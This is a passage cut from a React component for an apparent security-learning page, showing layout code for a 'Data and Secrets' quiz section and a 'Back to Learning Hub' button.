                  <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>
                    {item.title}
                  </Typography>
                  <Typography variant="body2" color="text.secondary">
                    {item.desc}
                  </Typography>
                </Box>
              </Box>
            </Grid>
          ))}
        </Grid>
      </Paper>

      <Paper
        id="quiz-section"
        sx={{
          mt: 4,
          p: 4,
          borderRadius: 3,
          border: `1px solid ${alpha(QUIZ_ACCENT_COLOR, 0.2)}`,
          bgcolor: alpha(QUIZ_ACCENT_COLOR, 0.03),
        }}
      >
        <Typography variant="h5" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
          <QuizIcon sx={{ color: QUIZ_ACCENT_COLOR }} />
          Knowledge Check
        </Typography>
        <QuizSection
          questions={quizQuestions}
          accentColor={QUIZ_ACCENT_COLOR}
          title="Data and Secrets Knowledge Check"
          description="Random 10-question quiz drawn from a 75-question bank each time you start the quiz."
          questionsPerQuiz={QUIZ_QUESTION_COUNT}
        />
      </Paper>

      {/* Bottom Navigation */}
      <Box sx={{ mt: 4, textAlign: "center" }}>
        <Button
          variant="outlined"
          startIcon={<ArrowBackIcon />}
          onClick={() => navigate("/learn")}
          sx={{ borderColor: "#8b5cf6", color: "#8b5cf6" }}
        >
          Back to Learning Hub
        </Button>
      </Box>
    </Container>
    </LearnPageLayout>
  );
}
